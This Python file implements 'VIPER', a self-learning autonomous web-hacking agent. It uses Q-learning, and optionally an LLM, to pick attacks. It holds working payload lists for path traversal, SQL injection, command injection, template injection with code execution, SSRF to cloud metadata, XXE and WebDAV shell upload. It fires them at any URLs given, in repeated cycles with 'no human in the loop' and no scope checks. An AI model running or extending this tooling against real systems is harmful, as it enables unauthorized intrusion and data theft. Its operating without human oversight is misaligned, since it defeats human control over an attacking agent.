#!/usr/bin/env python3
"""
VIPER Brain - Self-Learning Autonomous Hacking Agent

VIPER trains itself. VIPER improves itself. VIPER hunts by itself.
No human in the loop. Pure autonomous evolution.

Core loop:
1. Learn from past experience (Natas, CTFs, real targets)
2. Extract attack patterns
3. Build decision trees
4. Hunt autonomously
5. Learn from results
6. Repeat forever
"""

import asyncio
import aiohttp
import json
import random
import re
import os
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import numpy as np

# Add Go tools to PATH if available (for nuclei, httpx, subfinder, etc.)
_go_bin = os.path.join(os.path.expanduser("~"), "go", "bin")
if os.path.isdir(_go_bin):
    os.environ["PATH"] = _go_bin + os.pathsep + os.environ.get("PATH", "")

HACKAGENT_DIR = Path(__file__).parent
MODELS_DIR = HACKAGENT_DIR / "models"
KNOWLEDGE_DIR = HACKAGENT_DIR / "knowledge"
LOGS_DIR = HACKAGENT_DIR / "logs"
REPORTS_DIR = HACKAGENT_DIR / "reports"

for d in [MODELS_DIR, KNOWLEDGE_DIR, LOGS_DIR, REPORTS_DIR]:
    d.mkdir(exist_ok=True)

# Knowledge files
ATTACK_PATTERNS = KNOWLEDGE_DIR / "attack_patterns.json"
VULN_SIGNATURES = KNOWLEDGE_DIR / "vuln_signatures.json"
EXPLOIT_CHAINS = KNOWLEDGE_DIR / "exploit_chains.json"
BRAIN_STATE = MODELS_DIR / "viper_brain.json"


class AttackType(Enum):
    VIEW_SOURCE = "view_source"
    DIRECTORY_LISTING = "directory_listing"
    ROBOTS_TXT = "robots_txt"
    LFI = "lfi"
    RFI = "rfi"
    SQLI = "sqli"
    XSS = "xss"
    CMDI = "command_injection"
    SSTI = "ssti"
    SSRF = "ssrf"
    XXE = "xxe"
    IDOR = "idor"
    AUTH_BYPASS = "auth_bypass"
    COOKIE_MANIPULATION = "cookie_manipulation"
    HEADER_INJECTION = "header_injection"
    ENCODING_BYPASS = "encoding_bypass"
    WEBDAV = "webdav"
    FILE_UPLOAD = "file_upload"
    DESERIALIZATION = "deserialization"


@dataclass
class AttackPattern:
    """A learned attack pattern"""
    attack_type: str
    indicators: List[str]  # What to look for
    payloads: List[str]    # What to try
    success_markers: List[str]  # How to know it worked
    success_rate: float = 0.0
    times_used: int = 0
    times_succeeded: int = 0


@dataclass
class ExploitChain:
    """A sequence of attacks that leads to success"""
    name: str
    steps: List[str]  # Attack types in order
    conditions: Dict[str, str]  # When to use this chain
    success_rate: float = 0.0


class ViperBrain:
    """
    VIPER's autonomous learning brain.

    Learns attack patterns from experience.
    Builds exploit chains.
    Decides what to try next.
    Improves over time.
    """

    def __init__(self):
        self.attack_patterns: Dict[str, AttackPattern] = {}
        self.exploit_chains: List[ExploitChain] = []
        self.q_table: Dict[Tuple, Dict[str, float]] = {}
        self.experience_buffer: List[Dict] = []
        self.total_hunts = 0
        self.total_pwns = 0
        self.evograph = None  # Set externally by ViperCore

        self._load_knowledge()
        self._load_brain()
    
    def _load_knowledge(self):
        """Load learned knowledge from files"""
        # Load attack patterns
        if ATTACK_PATTERNS.exists():
            data = json.loads(ATTACK_PATTERNS.read_text())
            for name, pattern in data.items():
                self.attack_patterns[name] = AttackPattern(**pattern)
        else:
            self._init_base_patterns()
        
        # Load exploit chains
        if EXPLOIT_CHAINS.exists():
            data = json.loads(EXPLOIT_CHAINS.read_text())
            self.exploit_chains = [ExploitChain(**c) for c in data]
        else:
            self._init_base_chains()
    
    def _load_brain(self):
        """Load Q-table and state from JSON"""
        if BRAIN_STATE.exists():
            try:
                state = json.loads(BRAIN_STATE.read_text())
                # Q-table keys are stored as JSON strings, convert back to tuples
                raw_q = state.get('q_table', {})
                self.q_table = {}
                for key_str, actions in raw_q.items():
                    try:
                        key = tuple(json.loads(key_str))
                    except (json.JSONDecodeError, TypeError):
                        key = tuple(key_str.split(','))
                    self.q_table[key] = actions
                self.total_hunts = state.get('total_hunts', 0)
                self.total_pwns = state.get('total_pwns', 0)
                self.experience_buffer = state.get('experience', [])[-10000:]
            except (json.JSONDecodeError, KeyError, ValueError) as e:
                pass
    
    def save(self):
        """Save all knowledge and state"""
        # Save attack patterns
        patterns_data = {}
        for name, p in self.attack_patterns.items():
            patterns_data[name] = {
                'attack_type': p.attack_type,
                'indicators': p.indicators,
                'payloads': p.payloads,
                'success_markers': p.success_markers,
                'success_rate': p.success_rate,
                'times_used': p.times_used,
                'times_succeeded': p.times_succeeded
            }
        ATTACK_PATTERNS.write_text(json.dumps(patterns_data, indent=2))
        
        # Save exploit chains
        chains_data = [
            {'name': c.name, 'steps': c.steps, 'conditions': c.conditions, 'success_rate': c.success_rate}
            for c in self.exploit_chains
        ]
        EXPLOIT_CHAINS.write_text(json.dumps(chains_data, indent=2))
        
        # Save brain state as JSON (tuple keys serialized as JSON strings)
        serializable_q = {json.dumps(list(k)): v for k, v in self.q_table.items()}
        BRAIN_STATE.write_text(json.dumps({
            'q_table': serializable_q,
            'total_hunts': self.total_hunts,
            'total_pwns': self.total_pwns,
            'experience': self.experience_buffer[-10000:]
        }, indent=2, default=str))
    
    def _init_base_patterns(self):
        """Initialize with base attack patterns from Natas learnings"""
        self.attack_patterns = {
            'view_source': AttackPattern(
                attack_type='view_source',
                indicators=['<!--', 'comment', 'hidden'],
                payloads=['view-source:', 'Ctrl+U'],
                success_markers=['password', 'secret', 'flag'],
                success_rate=0.8
            ),
            'directory_listing': AttackPattern(
                attack_type='directory_listing',
                indicators=['Index of', 'files/', 'Parent Directory'],
                payloads=['/files/', '/uploads/', '/backup/', '/admin/', '/.git/'],
                success_markers=['users.txt', '.txt', '.bak', 'password'],
                success_rate=0.6
            ),
            'robots_txt': AttackPattern(
                attack_type='robots_txt',
                indicators=['robots.txt', 'Disallow'],
                payloads=['/robots.txt'],
                success_markers=['Disallow:', 'secret', 'admin', 'private'],
                success_rate=0.7
            ),
            'lfi': AttackPattern(
                attack_type='lfi',
                indicators=['page=', 'file=', 'include=', 'path=', 'doc='],
                payloads=[
                    '/etc/passwd',
                    '....//....//....//etc/passwd',
                    'php://filter/convert.base64-encode/resource=/etc/passwd',
                    '/etc/natas_webpass/natas',
                    '....//....//....//....//etc/natas_webpass/natas'
                ],
                success_markers=['root:x:0:0', 'root:', 'natas'],
                success_rate=0.5
            ),
            'sqli': AttackPattern(
                attack_type='sqli',
                indicators=['id=', 'user=', 'username=', 'search=', 'query='],
                payloads=[
                    "'",
                    "' OR '1'='1",
                    "' OR '1'='1'--",
                    "admin'--",
                    "1' UNION SELECT",
                    "1 AND 1=1",
                    "1 AND 1=2"
                ],
                success_markers=['sql', 'mysql', 'syntax', 'error', 'query'],
                success_rate=0.4
            ),
            'command_injection': AttackPattern(
                attack_type='command_injection',
                indicators=['cmd=', 'exec=', 'command=', 'ping=', 'host='],
                payloads=[
                    '; id',
                    '| id',
                    '`id`',
                    '$(id)',
                    '; cat /etc/passwd',
                    '| cat /etc/passwd'
                ],
                success_markers=['uid=', 'root:', 'www-data'],
                success_rate=0.3
            ),
            'cookie_manipulation': AttackPattern(
                attack_type='cookie_manipulation',
                indicators=['cookie', 'session', 'logged', 'auth'],
                payloads=[
                    'loggedin=1',
                    'admin=1',
                    'user=admin',
                    'authenticated=true'
                ],
                success_markers=['Access granted', 'Welcome', 'password'],
                success_rate=0.5
            ),
            'header_injection': AttackPattern(
                attack_type='header_injection',
                indicators=['referer', 'Referer', 'redirect', 'from'],
                payloads=[
                    'Referer: http://admin.localhost',
                    'X-Forwarded-For: 127.0.0.1',
                    'X-Original-URL: /admin'
                ],
                success_markers=['Access granted', 'password', 'secret'],
                success_rate=0.4
            ),
            'encoding_bypass': AttackPattern(
                attack_type='encoding_bypass',
                indicators=['encoded', 'base64', 'secret', 'hash'],
                payloads=[
                    'base64_decode',
                    'hex2bin',
                    'strrev'
                ],
                success_markers=['password', 'secret', 'decoded'],
                success_rate=0.6
            ),
            'webdav': AttackPattern(
                attack_type='webdav',
                indicators=['/dav/', 'webdav', 'DAV'],
                payloads=[
                    'PUT /dav/shell.php',
                    'PROPFIND',
                    'MKCOL'
                ],
                success_markers=['201', '204', 'Created'],
                success_rate=0.7
            ),
            'source_disclosure': AttackPattern(
                attack_type='source_disclosure',
                indicators=['include', 'require', '.inc', '.php~', '.bak'],
                payloads=[
                    '/index-source.html',
                    '/index.php~',
                    '/index.php.bak',
                    '/includes/',
                    '/.git/HEAD'
                ],
                success_markers=['<?php', '$secret', '$password', 'function'],
                success_rate=0.5
            ),
            'ssti': AttackPattern(
                attack_type='ssti',
                indicators=['template', 'render', 'name=', 'msg=', 'preview'],
                payloads=[
                    '{{7*7}}',
                    '${7*7}',
                    '<%= 7*7 %>',
                    '{{config}}',
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    '#{7*7}',
                    '${T(java.lang.Runtime).getRuntime().exec("id")}',
                ],
                success_markers=['49', 'SECRET', 'subclasses', 'uid='],
                success_rate=0.35
            ),
            'ssrf': AttackPattern(
                attack_type='ssrf',
                indicators=['url=', 'fetch', 'proxy', 'load', 'redirect', 'target=', 'dest='],
                payloads=[
                    'http://127.0.0.1',
                    'http://localhost',
                    'http://169.254.169.254/latest/meta-data/',
                    'http://[::1]',
                    'http://0177.0.0.1',
                    'file:///etc/passwd',
                    'gopher://127.0.0.1:6379/_INFO',
                ],
                success_markers=['root:', 'ami-id', 'instance-id', 'redis_version', 'Apache', 'html'],
                success_rate=0.3
            ),
            'xxe': AttackPattern(
                attack_type='xxe',
                indicators=['xml', 'soap', 'content-type: application/xml', 'DOCTYPE'],
                payloads=[
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                ],
                success_markers=['root:', 'ami-id', 'passwd'],
                success_rate=0.25
            ),
            'idor': AttackPattern(
                attack_type='idor',
                indicators=['id=', 'user_id=', 'account=', 'profile/', 'order/'],
                payloads=[
                    'id=1',
                    'id=2',
                    'user_id=1',
                    'account=admin',
                    '../admin',
                ],
                success_markers=['admin', 'email', 'password', 'username', 'role'],
                success_rate=0.4
            ),
            'deserialization': AttackPattern(
                attack_type='deserialization',
                indicators=['viewstate', 'serialized', 'base64', 'rO0ABX', 'O:4:', 'a:2:'],
                payloads=[
                    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
                    'O:8:"stdClass":0:{}',
                    'a:1:{s:4:"test";s:4:"test";}',
                ],
                success_markers=['error', 'exception', 'unserialize', 'java.io', 'ClassNotFoundException'],
                success_rate=0.2
            ),
            'cors_misconfig': AttackPattern(
                attack_type='cors_misconfig',
                indicators=['Access-Control', 'CORS', 'Origin'],
                payloads=[
                    'Origin: https://evil.com',
                    'Origin: null',
                    'Origin: https://target.com.evil.com',
                ],
                success_markers=['Access-Control-Allow-Origin: https://evil.com',
                                'Access-Control-Allow-Origin: null',
                                'Access-Control-Allow-Credentials: true'],
                success_rate=0.45
            ),
            'open_redirect': AttackPattern(
                attack_type='open_redirect',
                indicators=['redirect', 'next=', 'url=', 'return=', 'goto=', 'continue='],
                payloads=[
                    'https://evil.com',
                    '//evil.com',
                    '/\\evil.com',
                    '//evil.com/%2f..',
                ],
                success_markers=['Location: https://evil.com', 'Location: //evil.com'],
                success_rate=0.5
            ),
        }
    
    def _init_base_chains(self):
        """Initialize exploit chains from Natas experience"""
        self.exploit_chains = [
            ExploitChain(
                name='source_to_shell',
                steps=['view_source', 'source_disclosure', 'lfi'],
                conditions={'has_php': 'true'},
                success_rate=0.6
            ),
            ExploitChain(
                name='webdav_pwn',
                steps=['directory_listing', 'webdav', 'command_injection'],
                conditions={'has_dav': 'true'},
                success_rate=0.8
            ),
            ExploitChain(
                name='auth_bypass_chain',
                steps=['robots_txt', 'cookie_manipulation', 'header_injection'],
                conditions={'has_login': 'true'},
                success_rate=0.5
            ),
            ExploitChain(
                name='injection_chain',
                steps=['sqli', 'command_injection', 'lfi'],
                conditions={'has_input': 'true'},
                success_rate=0.4
            ),
            ExploitChain(
                name='ssrf_to_rce',
                steps=['ssrf', 'lfi', 'command_injection'],
                conditions={'has_input': 'true'},
                success_rate=0.35
            ),
            ExploitChain(
                name='ssti_to_rce',
                steps=['ssti', 'command_injection'],
                conditions={'has_input': 'true'},
                success_rate=0.5
            ),
            ExploitChain(
                name='xxe_data_exfil',
                steps=['xxe', 'lfi', 'ssrf'],
                conditions={'has_xml': 'true'},
                success_rate=0.3
            ),
            ExploitChain(
                name='idor_to_takeover',
                steps=['idor', 'auth_bypass', 'cookie_manipulation'],
                conditions={'has_login': 'true'},
                success_rate=0.4
            ),
            ExploitChain(
                name='open_redirect_phish',
                steps=['open_redirect', 'xss', 'cookie_manipulation'],
                conditions={'has_login': 'true'},
                success_rate=0.35
            ),
            ExploitChain(
                name='cors_data_theft',
                steps=['cors_misconfig', 'idor'],
                conditions={'has_login': 'true'},
                success_rate=0.45
            ),
            ExploitChain(
                name='deser_to_rce',
                steps=['deserialization', 'command_injection'],
                conditions={'has_input': 'true'},
                success_rate=0.25
            ),
        ]
    
    def learn_from_natas(self):
        """Learn from Natas progress file"""
        natas_state = MODELS_DIR / "natas_progress.json"
        if not natas_state.exists():
            print("[!] No Natas progress to learn from")
            return
        
        data = json.loads(natas_state.read_text())
        techniques = data.get('techniques', [])
        levels = data.get('levels', [])
        
        print(f"[*] Learning from Natas: {len(techniques)} techniques, {len(levels)} levels")
        
        # Update pattern success rates based on what worked
        for level in levels:
            if level.get('solved'):
                technique = level.get('technique', '')
                if technique in self.attack_patterns:
                    p = self.attack_patterns[technique]
                    p.times_used += 1
                    p.times_succeeded += 1
                    p.success_rate = p.times_succeeded / p.times_used
        
        # Learn new patterns from techniques
        for tech in techniques:
            if tech not in self.attack_patterns:
                # Create new pattern from name
                self.attack_patterns[tech] = AttackPattern(
                    attack_type=tech,
                    indicators=[tech.replace('_', ' ')],
                    payloads=[],
                    success_markers=['password', 'secret', 'flag'],
                    success_rate=0.5,
                    times_used=1,
                    times_succeeded=1
                )
        
        print(f"[+] Learned {len(self.attack_patterns)} attack patterns")
        self.save()
    
    async def choose_attack_smart(self, context: Dict, llm=None) -> str:
        """
        LLM-augmented attack selection.
        Uses Claude to reason about the best next attack, with Q-table rankings as context.
        Falls back to Q-learning if no LLM available.
        """
        if llm and llm.has_direct_api:
            try:
                # Get Q-table top picks as context for LLM
                valid = self._get_valid_attacks(context)
                state_key = self._context_to_state(context)
                q_vals = self.q_table.get(state_key, {})

                ranked = sorted(valid, key=lambda a: q_vals.get(a, 0) + (
                    self.attack_patterns.get(a, type('', (), {'success_rate': 0.5})()).success_rate
                    if hasattr(self.attack_patterns.get(a), 'success_rate') else 0.5
                ), reverse=True)[:5]

                suggestions = await llm.decide_next_attack(
                    target_info={
                        "url": context.get("url", ""),
                        "technologies": context.get("technologies", []),
                        "has_input": context.get("has_input", False),
                        "access_level": context.get("access_level", 0),
                    },
                    attack_history=self.experience_buffer[-20:],
                    findings=context.get("findings", []),
                )

                # Match LLM suggestion to our known attack types
                for suggestion in suggestions:
                    s_lower = suggestion.lower().replace("-", "_").replace(" ", "_")
                    for pattern_name in self.attack_patterns:
                        if s_lower in pattern_name.lower() or pattern_name.lower() in s_lower:
                            return pattern_name
                    # Direct match
                    if s_lower in self.attack_patterns:
                        return s_lower

                # LLM didn't match — fall through to Q-learning
            except Exception:
                pass

        return self.choose_attack(context)

    def choose_attack(self, context: Dict) -> str:
        """Choose best attack based on context, Q-values, and EvoGraph history."""
        # Build state from context
        state_key = self._context_to_state(context)

        # Get valid attacks for this context
        valid_attacks = self._get_valid_attacks(context)

        if not valid_attacks:
            return random.choice(list(self.attack_patterns.keys()))

        # Epsilon-greedy: 10% explore, 90% exploit
        if random.random() < 0.1:
            return random.choice(valid_attacks)

        # EvoGraph: get historical success rates for this tech stack
        evo_bonus: Dict[str, float] = {}
        if self.evograph:
            try:
                tech_stack = list(context.get("technologies", []))
                if tech_stack:
                    best = self.evograph.get_best_attacks_for_tech(tech_stack, top_n=20)
                    for entry in best:
                        evo_bonus[entry["attack_type"]] = entry["success_rate"] * 2.0
                    # Deprioritize known failures
                    failed = self.evograph.get_failed_approaches(tech_stack)
                    for f in failed:
                        evo_bonus[f] = evo_bonus.get(f, 0) - 1.0
            except Exception:
                pass

        # Get Q-values
        if state_key not in self.q_table:
            self.q_table[state_key] = {}

        q_values = self.q_table[state_key]

        # Find best attack
        best_attack = None
        best_value = float('-inf')

        for attack in valid_attacks:
            # Combine Q-value with pattern success rate and EvoGraph history
            q_val = q_values.get(attack, 0)
            pattern = self.attack_patterns.get(attack)
            pattern_bonus = pattern.success_rate if pattern else 0.5

            adaptive_adj = self.get_priority_adjustment(attack)
            evo_adj = evo_bonus.get(attack, 0)
            combined = q_val + pattern_bonus + adaptive_adj + evo_adj
            if combined > best_value:
                best_value = combined
                best_attack = attack

        return best_attack or random.choice(valid_attacks)
    
    def _context_to_state(self, context: Dict) -> Tuple:
        """Convert context dict to hashable state tuple"""
        return (
            context.get('has_php', False),
            context.get('has_input', False),
            context.get('has_dav', False),
            context.get('has_login', False),
            context.get('access_level', 0),
            tuple(sorted(context.get('vulns_found', [])))
        )
    
    def _get_valid_attacks(self, context: Dict) -> List[str]:
        """Get attacks valid for this context"""
        valid = []
        
        # Check each pattern's indicators against context
        page_content = context.get('page_content', '').lower()
        url = context.get('url', '').lower()
        
        for name, pattern in self.attack_patterns.items():
            for indicator in pattern.indicators:
                if indicator.lower() in page_content or indicator.lower() in url:
                    valid.append(name)
                    break
        
        # If nothing matches, return all patterns
        return valid if valid else list(self.attack_patterns.keys())
    
    def update(self, context: Dict, attack: str, reward: float, new_context: Dict):
        """Update Q-values based on result"""
        state = self._context_to_state(context)
        new_state = self._context_to_state(new_context)
        
        if state not in self.q_table:
            self.q_table[state] = {}
        
        # Q-learning update
        current_q = self.q_table[state].get(attack, 0)
        max_next_q = max(self.q_table.get(new_state, {}).values()) if self.q_table.get(new_state) else 0
        
        alpha = 0.3  # Learning rate
        gamma = 0.95  # Discount
        
        new_q = current_q + alpha * (reward + gamma * max_next_q - current_q)
        self.q_table[state][attack] = new_q
        
        # Update pattern stats
        if attack in self.attack_patterns:
            pattern = self.attack_patterns[attack]
            pattern.times_used += 1
            if reward > 0:
                pattern.times_succeeded += 1
            pattern.success_rate = pattern.times_succeeded / max(pattern.times_used, 1)
        
        # Store experience
        self.experience_buffer.append({
            'timestamp': datetime.now().isoformat(),
            'state': str(state),
            'attack': attack,
            'reward': reward,
            'new_state': str(new_state)
        })
    
    # ── Adaptive Learning from Validation Results ──

    def record_validation(self, attack_type: str, payload: str, target: str,
                          validated: bool, confidence: float):
        """Record whether a finding passed or failed validation for adaptive learning."""
        if not hasattr(self, '_validation_records'):
            self._validation_records = []
        self._validation_records.append({
            'attack_type': attack_type,
            'payload': payload,
            'target': target,
            'validated': validated,
            'confidence': confidence,
            'timestamp': datetime.now().isoformat(),
        })
        # Update pattern stats based on validation
        if attack_type in self.attack_patterns:
            pattern = self.attack_patterns[attack_type]
            pattern.times_used += 1
            if validated:
                pattern.times_succeeded += 1
            pattern.success_rate = pattern.times_succeeded / max(pattern.times_used, 1)

        # After enough data, compute per-type priority adjustments
        self._update_adaptive_priorities()

    def _update_adaptive_priorities(self):
        """Adjust attack priorities based on accumulated validation success rates."""
        if not hasattr(self, '_validation_records'):
            return
        if not hasattr(self, '_priority_adjustments'):
            self._priority_adjustments = {}

        # Group by attack_type
        from collections import Counter
        type_counts = Counter()
        type_successes = Counter()
        for rec in self._validation_records:
            at = rec['attack_type']
            type_counts[at] += 1
            if rec['validated']:
                type_successes[at] += 1

        for at, count in type_counts.items():
            if count < 10:
                continue
            rate = type_successes[at] / count
            if rate < 0.1:
                self._priority_adjustments[at] = -0.5  # Deprioritize
            elif rate > 0.3:
                self._priority_adjustments[at] = 0.5   # Boost
            else:
                self._priority_adjustments[at] = 0.0

    def get_priority_adjustment(self, attack_type: str) -> float:
        """Get the adaptive priority adjustment for an attack type."""
        if not hasattr(self, '_priority_adjustments'):
            return 0.0
        return self._priority_adjustments.get(attack_type, 0.0)

    def get_stats(self) -> Dict:
        """Get brain statistics"""
        stats = {
            'total_hunts': self.total_hunts,
            'total_pwns': self.total_pwns,
            'pwn_rate': self.total_pwns / max(self.total_hunts, 1),
            'patterns_known': len(self.attack_patterns),
            'chains_known': len(self.exploit_chains),
            'q_states': len(self.q_table),
            'experiences': len(self.experience_buffer),
            'top_patterns': sorted(
                [(n, p.success_rate, p.times_used) for n, p in self.attack_patterns.items()],
                key=lambda x: x[1],
                reverse=True
            )[:5]
        }
        if hasattr(self, '_priority_adjustments') and self._priority_adjustments:
            stats['adaptive_adjustments'] = dict(self._priority_adjustments)
        return stats


class ViperAutonomous:
    """
    Fully autonomous VIPER agent.
    
    Uses ViperBrain to make decisions.
    Hunts targets without human input.
    Learns and improves continuously.
    """
    
    def __init__(self):
        self.brain = ViperBrain()
        self.session: Optional[aiohttp.ClientSession] = None
        self.log_file = LOGS_DIR / f"viper_auto_{datetime.now().strftime('%Y%m%d')}.log"
    
    def log(self, msg: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        line = f"[{timestamp}] {msg}"
        print(line)
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    
    async def request(self, url: str, method: str = "GET", **kwargs) -> Tuple[int, str, Dict]:
        try:
            async with self.session.request(method, url, timeout=aiohttp.ClientTimeout(total=15), 
                                            ssl=False, **kwargs) as resp:
                body = await resp.text()
                return resp.status, body, dict(resp.headers)
        except Exception as e:
            return 0, str(e), {}
    
    async def hunt_target(self, url: str) -> Dict:
        """Hunt a single target autonomously"""
        self.log(f"Hunting: {url}")
        self.brain.total_hunts += 1
        
        context = {
            'url': url,
            'access_level': 0,
            'vulns_found': [],
            'page_content': '',
            'has_php': False,
            'has_input': False,
            'has_dav': False,
            'has_login': False
        }
        
        findings = []
        max_steps = 20
        
        for step in range(max_steps):
            # Get page content
            status, body, headers = await self.request(url)
            if status == 0:
                self.log(f"  [-] Failed to connect")
                break
            
            context['page_content'] = body
            context['has_php'] = '.php' in url or '<?php' in body
            context['has_input'] = '<input' in body or '<form' in body
            context['has_dav'] = '/dav/' in body or 'webdav' in body.lower()
            context['has_login'] = 'login' in body.lower() or 'password' in body.lower()
            
            # Brain chooses attack
            attack = self.brain.choose_attack(context)
            self.log(f"  [{step+1}] Trying: {attack}")
            
            # Execute attack
            reward, new_context, finding = await self.execute_attack(url, attack, context)
            
            if finding:
                findings.append(finding)
                self.log(f"  [!] FOUND: {finding['type']}")
            
            # Update brain
            self.brain.update(context, attack, reward, new_context)
            context = new_context
            
            # Check if we got somewhere significant
            if context['access_level'] >= 3:  # Got shell or higher
                self.brain.total_pwns += 1
                self.log(f"  [+] PWNED! Access level: {context['access_level']}")
                break
            
            if reward <= -5:  # Bad attack, try something else
                continue
        
        # Save brain
        self.brain.save()
        
        return {
            'url': url,
            'findings': findings,
            'final_access': context['access_level'],
            'pwned': context['access_level'] >= 3
        }
    
    async def execute_attack(self, base_url: str, attack: str, context: Dict) -> Tuple[float, Dict, Optional[Dict]]:
        """Execute an attack and return (reward, new_context, finding)"""
        new_context = context.copy()
        reward = -1  # Default: no progress
        finding = None
        
        pattern = self.brain.attack_patterns.get(attack)
        if not pattern:
            return reward, new_context, None
        
        # Try each payload
        for payload in pattern.payloads[:3]:  # Max 3 payloads per attack
            # Build URL/request based on attack type
            if attack in ['lfi', 'sqli', 'command_injection']:
                # Find parameter to inject
                test_url = self._inject_payload(base_url, context['page_content'], payload)
                if test_url:
                    status, body, _ = await self.request(test_url)
                    
                    # Check for success
                    for marker in pattern.success_markers:
                        if marker.lower() in body.lower():
                            reward = 10
                            new_context['vulns_found'].append(attack)
                            finding = {'type': attack, 'payload': payload, 'marker': marker}
                            
                            if attack == 'command_injection':
                                new_context['access_level'] = 3  # Shell
                            break
            
            elif attack == 'directory_listing':
                test_url = base_url.rstrip('/') + payload
                status, body, _ = await self.request(test_url)
                
                if status == 200:
                    for marker in pattern.success_markers:
                        if marker.lower() in body.lower():
                            reward = 5
                            new_context['vulns_found'].append(attack)
                            finding = {'type': attack, 'url': test_url}
                            break
            
            elif attack == 'robots_txt':
                test_url = base_url.rstrip('/') + '/robots.txt'
                status, body, _ = await self.request(test_url)
                
                if status == 200 and 'Disallow' in body:
                    reward = 5
                    new_context['vulns_found'].append(attack)
                    # Extract hidden paths
                    paths = re.findall(r'Disallow:\s*(/\S+)', body)
                    finding = {'type': attack, 'hidden_paths': paths}
            
            elif attack == 'webdav':
                test_url = base_url.rstrip('/') + '/dav/'
                status, body, _ = await self.request(test_url)
                
                if status == 200:
                    # Try PUT
                    shell_url = test_url + f'test_{int(datetime.now().timestamp())}.txt'
                    try:
                        async with self.session.put(shell_url, data='viper_test') as resp:
                            if resp.status in [200, 201, 204]:
                                reward = 15
                                new_context['access_level'] = 2
                                new_context['vulns_found'].append(attack)
                                finding = {'type': attack, 'upload_url': shell_url}
                    except:
                        pass
            
            if reward > 0:
                break
        
        return reward, new_context, finding
    
    def _inject_payload(self, base_url: str, page_content: str, payload: str) -> Optional[str]:
        """Find injection point and inject payload"""
        import urllib.parse
        
        # Find parameters in URL
        parsed = urllib.parse.urlparse(base_url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            # Inject into first param
            for param in params:
                new_params = params.copy()
                new_params[param] = [payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                return urllib.parse.urlunparse(parsed._replace(query=new_query))
        
        # Find parameters in forms
        form_match = re.search(r'name=["\'](\w+)["\']', page_content)
        if form_match:
            param = form_match.group(1)
            return f"{base_url}?{param}={urllib.parse.quote(payload)}"
        
        return None
    
    async def continuous_hunt(self, targets: List[str], cycles: int = -1):
        """Hunt continuously"""
        self.log("="*60)
        self.log("VIPER Autonomous Mode Started")
        self.log(f"Targets: {len(targets)}")
        self.log(f"Brain stats: {self.brain.get_stats()}")
        self.log("="*60)
        
        cycle = 0
        async with aiohttp.ClientSession() as self.session:
            while cycles == -1 or cycle < cycles:
                cycle += 1
                self.log(f"\n=== Cycle {cycle} ===")
                
                for target in targets:
                    result = await self.hunt_target(target)
                    
                    if result['findings']:
                        self.log(f"[+] {len(result['findings'])} findings for {target}")
                    
                    await asyncio.sleep(2)  # Rate limit
                
                # Print stats
                stats = self.brain.get_stats()
                self.log(f"\nStats: Hunts={stats['total_hunts']}, Pwns={stats['total_pwns']}, Rate={stats['pwn_rate']:.1%}")
                
                if cycles == -1:
                    await asyncio.sleep(300)  # 5 min between cycles


async def main():
    import sys
    
    # Initialize brain
    brain = ViperBrain()
    
    if len(sys.argv) > 1 and sys.argv[1] == '--learn':
        # Learn from Natas
        print("[*] Learning from Natas experience...")
        brain.learn_from_natas()
        print(f"[+] Brain stats: {brain.get_stats()}")
        return
    
    if len(sys.argv) > 1 and sys.argv[1] == '--stats':
        print(json.dumps(brain.get_stats(), indent=2, default=str))
        return
    
    # Default: learn then hunt
    print("[*] VIPER Brain initializing...")
    brain.learn_from_natas()
    
    # Hunt test targets
    viper = ViperAutonomous()
    
    # Get targets from args or use defaults
    targets = sys.argv[1:] if len(sys.argv) > 1 else []
    
    if not targets:
        print("[*] No targets provided. Use: python viper_brain.py <url1> <url2> ...")
        print("[*] Or: python viper_brain.py --learn")
        print("[*] Or: python viper_brain.py --stats")
        return
    
    await viper.continuous_hunt(targets, cycles=1)


if __name__ == "__main__":
    asyncio.run(main())
